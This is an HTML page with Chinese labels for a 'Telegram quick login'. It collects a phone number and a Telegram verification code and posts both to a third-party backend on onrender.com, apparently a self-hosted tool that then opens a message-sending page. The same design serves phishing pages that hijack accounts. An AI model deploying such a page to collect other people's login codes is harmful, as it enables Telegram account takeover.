
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram 控制台</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: sans-serif; padding: 20px;">
  <h2>📲 Telegram 快速登录</h2>
  <form id="login-form">
    <label>📞 手机号（含+886）：</label><br/>
    <input type="text" id="phone" required><br/><br/>
    <button type="submit">发送验证码</button>
  </form>
  <br/>
  <form id="verify-form" style="display:none;">
    <label>✉️ 输入验证码：</label><br/>
    <input type="text" id="code" required><br/><br/>
    <button type="submit">完成登录</button>
  </form>
  <script>
    const API_BASE = 'https://telegram-backend-sljv.onrender.com'; // 修改为你的 Python 后端地址

    document.getElementById("login-form").onsubmit = async function(e) {
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const res = await fetch(API_BASE + "/send_code", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ phone })
      });
      alert("验证码已发送，请查看 Telegram 应用");
      document.getElementById("verify-form").style.display = "block";
    };

    document.getElementById("verify-form").onsubmit = async function(e) {
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const code = document.getElementById("code").value;
      const res = await fetch(API_BASE + "/verify", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ phone, code })
      });
      const data = await res.json();
      if (data.success) {
        alert("✅ 登录成功！");
        window.location.href = "send.html";
      } else {
        alert("❌ 验证失败");
      }
    };
  </script>
</body>
</html>
